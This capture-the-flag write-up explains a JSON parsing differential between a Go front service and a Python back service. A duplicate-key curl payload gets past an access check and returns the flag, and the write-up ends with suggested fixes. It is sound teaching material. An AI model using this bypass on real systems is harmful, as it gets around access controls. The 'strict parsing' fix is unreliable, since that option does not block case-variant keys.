# Space Explorer

<img width="1612" height="289" alt="image" src="https://github.com/user-attachments/assets/a639d3b8-a5bc-4491-b688-215e39cf496e" />

---

## 🔍 Step 1: Initial Reconnaissance

### What We Had

We were given a zip file containing the source code:

```
space_explorer/
├── build-docker.sh
├── Dockerfile
├── entrypoint.sh
├── go-app/
│   ├── main.go          # Go application (Sender)
│   └── go.mod
└── python-service/
    └── app.py           # Python application (Receiver)
```

### Architecture

From `entrypoint.sh`:
```bash
python -m gunicorn --workers 4 -b 127.0.0.1:8081 app:app &
docker-gs-ping &
```

- **Go Service** → Port `8080` (later exposed on port `32320`)
- **Python Service** → Port `8081` (internal only)

---

## 📊 Step 2: Analyzing the Source Code

### Go Service (`go-app/main.go`)

```go
type RequestData struct {
    Action string `json:"action"`
}

func executeHandler(w http.ResponseWriter, r *http.Request) {
    // ... parse JSON ...
    
    switch requestData.Action {
    case "getcosmic":
        // Forward to Python service
        resp, err := http.Post("http://localhost:8081/execute", 
                              "application/json", 
                              bytes.NewBuffer(body))
        // Return Python's response
    case "getSecureCode":
        w.Write([]byte("Access denied: Invalid security clearance"))
    default:
        http.Error(w, "Invalid command", http.StatusBadRequest)
    }
}
```

**Key Observation:** Go blocks `getSecureCode` but forwards `getcosmic` to Python.

### Python Service (`python-service/app.py`)

```python
@app.route('/execute', methods=['POST'])
def execute():
    data = request.get_json()
    
    if data['action'] == "getcosmic":
        return jsonify(random.choice(COSMIC_ANOMALIES))
    elif data['action'] == "getSecureCode":
        return jsonify({
            "flag": os.getenv("FLAG", "HTB{flag_not_set}"),
            "name": "Captain's Log",
            "src": "https://..."
        })
    else:
        return jsonify({"error": "Unknown command"}), 400
```

**Key Observation:** Python accepts `getSecureCode` and returns the flag!

---

## 🔎 Step 3: Identifying the Vulnerability

### The Problem

The Go service blocks `getSecureCode` requests. We need to bypass this block but still reach the Python service.

### The Flaw: JSON Parsing Differential

| Language | JSON Key Matching |
|----------|-------------------|
| **Go** | Case-**insensitive** |
| **Python** | Case-**sensitive** |

### How This Works

**Go's JSON Parsing:**
- `json.Unmarshal()` is case-insensitive
- `"action"`, `"Action"`, `"ACTION"` all map to the same struct field
- If multiple keys match, the **last one wins**

**Python's JSON Parsing:**
- Dictionary keys are case-sensitive
- `"action"` and `"Action"` are **different** keys

---

## 🚀 Step 4: Crafting the Exploit

### The Payload

```json
{
    "action": "getSecureCode",
    "Action": "getcosmic"
}
```

### What Happens (Step by Step)

#### Step 1: Request Sent to Go
```bash
curl -X POST http://154.57.164.82:32320/execute \
  -H "Content-Type: application/json" \
  -d '{"action": "getSecureCode", "Action": "getcosmic"}'
```

#### Step 2: Go Parses the JSON
- Go sees both `action` and `Action` as the same field
- Last matching key wins → `"Action": "getcosmic"`
- `requestData.Action = "getcosmic"`
- Passes the `switch` check ✅

#### Step 3: Go Forwards the Request
- Go forwards the **original request body** (not the parsed value)
- Python receives: `{"action": "getSecureCode", "Action": "getcosmic"}`

#### Step 4: Python Parses the JSON
- Python sees `action` and `Action` as **different** keys
- `data["action"] == "getSecureCode"`
- Returns the flag! 🏆

---

## 🎯 Step 5: The Exploit Code

```bash
curl -X POST http://154.57.164.82:32320/execute \
  -H "Content-Type: application/json" \
  -d '{"action": "getSecureCode", "Action": "getcosmic"}'
```

###  Response

```json
{
  "flag": "HTB{C0SM1C-BYP4SS}",
  "name": "Captain's Log",
  "src": "https://images.unsplash.com/photo-1534447677768-be436bb09401?w=600"
}
```

<img width="1290" height="183" alt="image" src="https://github.com/user-attachments/assets/898841fa-2922-4560-b650-8d36d954d72e" />

---

## 🛡️ Step 7: How to Fix This Vulnerability

### Option 1: Use the Same Parser
- Ensure both services use the same JSON parsing behavior
- Or normalize the request before forwarding

### Option 2: Validate Before Forwarding
```go
// Instead of forwarding raw body, reconstruct the request
validatedBody := []byte(`{"action":"getcosmic"}`)
resp, err := http.Post("http://localhost:8081/execute", 
                       "application/json", 
                       bytes.NewBuffer(validatedBody))
```

### Option 3: Use Strict JSON Parsing
```go
// Use a custom decoder with strict mode
decoder := json.NewDecoder(r.Body)
decoder.DisallowUnknownFields()
```

## 🔗 References

- [Go JSON Package](https://pkg.go.dev/encoding/json)
- [Python JSON Package](https://docs.python.org/3/library/json.html)
- [JSON Security Best Practices](https://owasp.org/www-community/attacks/JSON_Attacks)

